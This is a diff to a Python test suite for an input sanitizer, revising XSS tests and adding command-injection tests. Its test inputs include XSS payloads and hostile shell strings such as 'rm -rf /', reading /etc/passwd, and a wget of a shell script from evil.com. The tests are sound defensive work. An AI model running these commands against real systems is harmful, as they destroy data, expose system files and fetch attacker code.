@@ -12,7 +12,7 @@ class TestSanitizeStringXSS:
     def test_removes_script_tags(self):
         result = sanitize_string("<script>alert('xss')</script>")
         assert '<script>' not in result
-        assert '&lt;' in result
+        assert 'alert' not in result
 
     def test_removes_onerror_handler(self):
         result = sanitize_string('<img onerror="alert(1)" src="x">')
@@ -28,8 +28,9 @@ class TestSanitizeStringXSS:
 
     def test_encodes_html_entities(self):
         result = sanitize_string("Hello <b>World</b>")
-        assert '&lt;' in result
-        assert '&gt;' in result
+        assert '<b>' not in result
+        assert 'Hello' in result
+        assert 'World' in result
 
     def test_removes_data_protocol(self):
         result = sanitize_string("data:text/html,<script>alert(1)</script>")
@@ -82,6 +83,41 @@ class TestSanitizeStringPathTraversal:
     def test_safe_input_unchanged(self):
         result = sanitize_string("file.txt")
         assert result == "file.txt"
+
+
+class TestSanitizeStringCommandInjection:
+    """Test command injection prevention in sanitize_string."""
+
+    def test_removes_shell_metacharacters(self):
+        result = sanitize_string("hello; rm -rf /")
+        assert ';' not in result
+
+    def test_removes_pipe_operator(self):
+        result = sanitize_string("input | cat /etc/passwd")
+        assert '|' not in result
+
+    def test_removes_common_commands(self):
+        result = sanitize_string("wget http://evil.com/shell.sh")
+        assert 'wget' not in result.lower()
+
+    def test_removes_backticks(self):
+        result = sanitize_string("`whoami`")
+        assert '`' not in result
+
+    def test_removes_shell_redirection(self):
+        result = sanitize_string("echo malicious > /etc/passwd")
+        assert '>' not in result
+
+    def test_removes_node_and_powershell(self):
+        result = sanitize_string("node -e 'malicious' && powershell evil")
+        assert 'node' not in result.lower()
+        assert 'powershell' not in result.lower()
+
+    def test_safe_input_unchanged(self):
+        from arcis.sanitizers.sanitize import Sanitizer
+        sanitizer = Sanitizer(xss=False, sql=False, nosql=False, path=False, command=True)
+        result = sanitizer.sanitize_string("hello world")
+        assert result == "hello world"
 
 
 class TestSanitizeObjectPrototypePollution:
